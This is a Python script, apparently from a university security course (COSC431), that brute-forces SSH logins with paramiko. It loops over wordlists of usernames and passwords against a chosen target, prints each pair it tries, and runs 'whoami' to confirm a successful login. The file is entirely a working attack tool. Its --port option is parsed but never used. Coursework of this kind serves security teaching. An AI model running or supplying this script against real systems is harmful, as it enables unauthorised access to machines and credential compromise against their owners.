"""
COSC431 (slow) SSH Brute Force attack
By Andreas <git@fsck.rip>
"""

import argparse
from typing import List
import paramiko
import paramiko.auth_strategy
import paramiko.client


# pylint: disable=R0903
class ProgramArguments(argparse.Namespace):
    """Arguments passed to the program."""

    target: str
    continue_on_success: bool
    username: List[str] | str
    password: List[str] | str
    port: int


def main(args: ProgramArguments) -> None:
    """The program."""
    client = paramiko.client.SSHClient()
    usernames: List[str] | str = []
    passwords: List[str] | str = []
    continue_on_success = args.continue_on_success

    try:
        if len(args.username) > 1:
            raise TypeError("More than one username entry, exiting condition.")

        file = open(file=args.username[0], encoding="utf-8")
        for entry in file:
            usernames.append(entry.strip("\n"))

        print(f"Reading usernames from {file.name}")
    except (FileNotFoundError, TypeError):
        usernames = args.username

    try:
        if len(args.password) > 1:
            raise TypeError("More than one password entry, exiting condition.")

        file = open(file=args.password[0], encoding="utf-8")
        for entry in file:
            passwords.append(entry.strip("\n"))

        print(f"Reading passwords from {file.name}")
    except (FileNotFoundError, TypeError):
        passwords = args.password

    print("")

    paramiko.util.log_to_file("./logs/paramiko.log")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying combination {username}:{password}")
                client.connect(
                    hostname=args.target,
                    username=username,
                    password=password,
                )

                _stdin, stdout, _stderr = client.exec_command("whoami")
                lines = stdout.read().decode()

                if len(lines) >= 1:
                    print("Success.\n")
                    if not continue_on_success:
                        client.close()
                        return

                client.close()
            except paramiko.ssh_exception.SSHException as e:
                print(f"{e}\n")


if __name__ == "__main__":
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="Run a brute force SSH attack against a machine."
    )
    parser.add_argument(
        "target", help="The machine to target. Can be an IP or hostname.", type=str
    )
    parser.add_argument(
        "--username",
        help="A username, or a path to a list of usernames to try.",
        required=True,
        action="append",
        type=str,
    )
    parser.add_argument(
        "--password",
        help="A password, or a path to a list of passwords to try.",
        required=True,
        action="append",
        type=str,
    )
    parser.add_argument("--port", help="Port to target", default=22, type=int)
    parser.add_argument(
        "--continue_on_success",
        help="Keep trying other combination when successful.",
        action="store_true",
    )

    main(parser.parse_args())
